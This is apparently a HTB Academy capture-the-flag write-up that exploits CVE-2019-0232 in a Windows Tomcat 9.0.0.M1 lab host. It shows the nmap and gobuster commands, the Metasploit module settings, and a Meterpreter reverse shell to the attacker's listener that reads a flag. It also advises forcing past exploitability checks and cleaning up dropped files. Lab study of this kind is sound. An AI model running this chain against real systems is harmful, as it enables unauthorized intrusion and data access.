# Attacking Common Applications — Skills Assessment I

| Field | Details |
|-------|---------|
| Module | 24 — Attacking Common Applications |
| Assessment | Skills Assessment I |
| Difficulty | Medium |
| OS | Windows |
| Target | `10.129.201.89:8080` |
| Attacker | `10.10.16.36` |
| Date | September 2026 |

---

## Table of Contents

- [Attack Chain Summary](#attack-chain-summary)
- [Question 1 — Identify the Vulnerable Application](#question-1--identify-the-vulnerable-application)
- [Question 2 — Identify the Listening Port](#question-2--identify-the-listening-port)
- [Question 3 — Identify the Application Version](#question-3--identify-the-application-version)
- [Question 4 — RCE via CVE-2019-0232 and Flag Capture](#question-4--rce-via-cve-2019-0232-and-flag-capture)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Full Attack Chain Reference](#full-attack-chain-reference)
- [Commands Reference](#commands-reference)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|--------|
| 1 | Nmap aggressive scan (`-A -Pn`) | Discovered Apache Tomcat 9.0.0.M1 on port 8080 (Windows host) |
| 2 | Gobuster CGI directory brute-force | Discovered `/cgi/cmd.bat` — the required CGI endpoint |
| 3 | Metasploit `exploit/windows/http/tomcat_cgi_cmdlineargs` | Exploited CVE-2019-0232 via malicious command-line argument injection |
| 4 | Meterpreter shell → file read | Retrieved flag from `C:\Users\Administrator\Desktop\flag.txt` |

---

## Question 1 — Identify the Vulnerable Application

**Question:** "What vulnerable application is running?"

### Step 1 — Nmap Aggressive Scan

The first step in any engagement against a black-box target is full service enumeration. An aggressive Nmap scan (`-A`) performs OS detection, version detection, default script scanning, and traceroute. The `-Pn` flag skips host discovery (ICMP ping), which is necessary when the target firewall drops pings — common on Windows hosts.

```bash
Hackerpatel007_1@htb[/htb]$ nmap -A -Pn 10.129.201.89
```

```
Starting Nmap 7.92 ( https://nmap.org ) at 2026-09-23 03:25 GMT
Nmap scan report for 10.129.201.89
Host is up (0.047s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
<SNIP>
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/9.0.0.M1
|_http-favicon: Apache Tomcat
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
<SNIP>
```

The scan reveals **Apache Tomcat** running on port 8080. The `http-title` script output unambiguously identifies the application and its version from the default Tomcat index page title.

> **Answer:** `Tomcat`

---

## Question 2 — Identify the Listening Port

**Question:** "What port is this application running on?"

### Step 1 — Review Nmap Output

No additional scanning required. The output from Question 1 already reveals the port. Port `8080` is the standard non-privileged alternative HTTP port for Java application servers — Tomcat defaults to this port when not running as root or when port 80 is occupied by another service (e.g., IIS).

```
PORT     STATE SERVICE       VERSION
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/9.0.0.M1
```

> **Answer:** `8080`

---

## Question 3 — Identify the Application Version

**Question:** "What version of the application is in use?"

### Step 1 — Extract Version from Nmap Output

The Nmap `http-title` script captures the default Tomcat welcome page title, which embeds the exact version string. Version `9.0.0.M1` (milestone release) predates the `9.0.17` stable release where the CGI Servlet argument injection bug was patched.

```
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/9.0.0.M1
```

> **Note:** Any Tomcat version below `9.0.17` on Windows is potentially vulnerable to CVE-2019-0232 if the CGI Servlet is enabled. The milestone build `9.0.0.M1` is an extremely early pre-release, making this target highly susceptible.

> **Answer:** `9.0.0.M1`

---

## Question 4 — RCE via CVE-2019-0232 and Flag Capture

**Question:** "Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop."

### Background — CVE-2019-0232

**CVE-2019-0232** is a critical remote code execution vulnerability in Apache Tomcat's **CGI Servlet** when running on **Windows**. The root cause is a flaw in how the **Java Runtime Environment** passes command-line arguments to Windows processes — specifically, Windows batch scripts executed through `cmd.exe`. Because batch files on Windows accept arguments via `%1`, `%2`, etc., and the JRE fails to properly sanitize argument delimiters, an attacker can inject additional commands by appending `&command` sequences to the CGI invocation URI. The CGI Servlet must be enabled and a `.bat` file must exist in the `/cgi/` directory.

**Affected versions:** Tomcat 9.0.0.M1–9.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93 (Windows only)

### Step 1 — Fuzz the CGI Directory for Batch Files

Before launching the exploit, the exact `.bat` filename in the `/cgi/` directory must be discovered. **Gobuster** is used with a wordlist of common parameter names, appending `.bat` as the extension.

```bash
Hackerpatel007_1@htb[/htb]$ gobuster dir -u http://10.129.201.89:8080/cgi/ \
  -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
  -x .bat -t 50 -k -q
```

```
/cmd.bat              (Status: 200) [Size: 0]
/Cmd.bat              (Status: 200) [Size: 0]
```

The file `/cgi/cmd.bat` returns HTTP 200, confirming it is a valid, accessible CGI endpoint. This is the injection point for CVE-2019-0232.

### Step 2 — Launch Metasploit and Load the Module

```bash
Hackerpatel007_1@htb[/htb]$ msfconsole -q
```

```
msf6 > use exploit/windows/http/tomcat_cgi_cmdlineargs
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

### Step 3 — Configure Module Options and Exploit

The critical options:
- `RHOSTS` — target IP
- `TARGETURI` — the discovered `.bat` CGI path
- `LHOST` — attacker VPN interface (`tun0`)
- `FORCEEXPLOIT true` — overrides the auto-check, which may reject the target if version fingerprinting is inconclusive

```bash
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set RHOSTS 10.129.201.89
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set TARGETURI /cgi/cmd.bat
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set LHOST tun0
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set FORCEEXPLOIT true
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > exploit
```

```
[*] Started reverse TCP handler on 10.10.16.36:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The target is not exploitable. ForceExploit is enabled, proceeding with exploitation.
[*] Command Stager progress -   6.95% done (6999/100668 bytes)
[*] Command Stager progress -  13.91% done (13998/100668 bytes)
[*] Command Stager progress -  20.86% done (20997/100668 bytes)
[*] Command Stager progress -  27.81% done (27996/100668 bytes)
[*] Command Stager progress -  34.76% done (34995/100668 bytes)
[*] Command Stager progress -  41.72% done (41994/100668 bytes)
[*] Command Stager progress -  48.67% done (48993/100668 bytes)
[*] Command Stager progress -  55.62% done (55992/100668 bytes)
[*] Command Stager progress -  62.57% done (62991/100668 bytes)
[*] Command Stager progress -  69.53% done (69990/100668 bytes)
[*] Command Stager progress -  76.48% done (76989/100668 bytes)
[*] Command Stager progress -  83.43% done (83988/100668 bytes)
[*] Command Stager progress -  90.38% done (90987/100668 bytes)
[*] Command Stager progress -  97.34% done (97986/100668 bytes)
[*] Sending stage (175686 bytes) to 10.129.201.89
[*] Command Stager progress - 100.02% done (100692/100668 bytes)
[!] Make sure to manually cleanup the exe generated by the exploit
[*] Meterpreter session 1 opened (10.10.16.36:4444 -> 10.129.201.89:49688) at 2026-09-23 08:36:44 +0000

(Meterpreter 1)(C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi) >
```

A Meterpreter session opens. The working directory is the Tomcat CGI directory — the shell runs under the Tomcat service account context.

> **Note:** The exploit note warns to manually clean up the dropped executable. The command stager writes a binary to disk during staging — in a real engagement this must be removed to reduce forensic artefacts.

### Step 4 — Read the Flag

```bash
(Meterpreter 1)(C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi) > cat C:/Users/Administrator/Desktop/flag.txt
```

```
HTB{flag_redacted}
```

The flag is accessible because Tomcat is running with elevated privileges. In production, Tomcat should run as a dedicated low-privilege service account with no access to administrative paths.

> **Flag:** `HTB{flag_redacted}`

---

## Flags

| Question | Description | Answer |
|----------|-------------|--------|
| Q1 | Vulnerable application name | `Tomcat` |
| Q2 | Application listening port | `8080` |
| Q3 | Application version | `9.0.0.M1` |
| Q4 | `flag.txt` on Administrator Desktop | `HTB{flag_redacted}` |

---

## Lessons Learned

- **CVE-2019-0232 only works when CGI Servlet is enabled and a `.bat` file exists in `/cgi/`.** The CGI Servlet in Tomcat is disabled by default and must be explicitly enabled in `web.xml`. Always check `web.xml` for `CGIServlet` configuration on Windows targets running older Tomcat versions.

- **Milestone builds (`.M1`, `.M2`, etc.) are pre-release and frequently unpatched.** A version like `9.0.0.M1` is a strong indicator of a frozen or abandoned deployment — common in legacy manufacturing, utilities, and embedded systems.

- **`FORCEEXPLOIT true` bypasses Metasploit's auto-check.** If you have strong evidence (version string from service banner, gobuster confirming a CGI endpoint), always override the check rather than abandoning the vector.

- **The CGI working directory reveals the deployment path.** The Meterpreter landing directory tells you exactly where Tomcat is installed, its webapp structure, and file layout — useful for locating configuration files, additional credentials, and pivot points.

- **Tomcat service account privilege level determines post-exploitation reach.** Immediate access to `C:\Users\Administrator\Desktop\` without privilege escalation means Tomcat was running as `SYSTEM` or the `Administrator` account — a critical misconfiguration. Always run `whoami` and `whoami /priv` immediately upon shell access.

---

## Full Attack Chain Reference

```
Nmap -A -Pn → Tomcat 9.0.0.M1 on :8080 (Windows)
        ↓
CVE-2019-0232 identified (pre-9.0.17, CGI Servlet, Windows host)
        ↓
Gobuster dir → /cgi/cmd.bat discovered (HTTP 200)
        ↓
MSF exploit/windows/http/tomcat_cgi_cmdlineargs
  RHOSTS=10.129.201.89 | TARGETURI=/cgi/cmd.bat | FORCEEXPLOIT=true
        ↓
Meterpreter session opened (reverse TCP :4444)
        ↓
cat C:/Users/Administrator/Desktop/flag.txt
        ↓
Flag captured: HTB{flag_redacted}
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `nmap -A -Pn 10.129.201.89` | Aggressive scan with OS/version detection; skip ping |
| `gobuster dir -u http://10.129.201.89:8080/cgi/ -w <wordlist> -x .bat -t 50 -k -q` | Brute-force CGI directory for `.bat` files |
| `msfconsole -q` | Launch Metasploit in quiet mode |
| `use exploit/windows/http/tomcat_cgi_cmdlineargs` | Load CVE-2019-0232 module |
| `set RHOSTS 10.129.201.89` | Set target IP |
| `set TARGETURI /cgi/cmd.bat` | Set discovered CGI endpoint |
| `set LHOST tun0` | Set listener to VPN interface |
| `set FORCEEXPLOIT true` | Bypass auto-exploitability check |
| `exploit` | Execute the exploit |
| `cat C:/Users/Administrator/Desktop/flag.txt` | Read flag (Meterpreter) |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1595 | T1595.001 | Active Scanning: Scanning IP Blocks — Nmap `-A -Pn` to enumerate open ports and service versions |
| T1592 | T1592.002 | Gather Victim Host Information: Software — version fingerprinting of Apache Tomcat via HTTP banner |
| T1190 | — | Exploit Public-Facing Application — CVE-2019-0232 via MSF `tomcat_cgi_cmdlineargs` |
| T1059 | T1059.003 | Command and Scripting Interpreter: Windows Command Shell — payload via `.bat` CGI execution |
| T1083 | — | File and Directory Discovery — navigation to Administrator Desktop to locate `flag.txt` |
| T1005 | — | Data from Local System — reading `flag.txt` via Meterpreter `cat` |

---

*Part of the HTB Academy CPTS path — Attacking Common Applications module.*  
*Penetration Tester role in India | Target: January 2027*
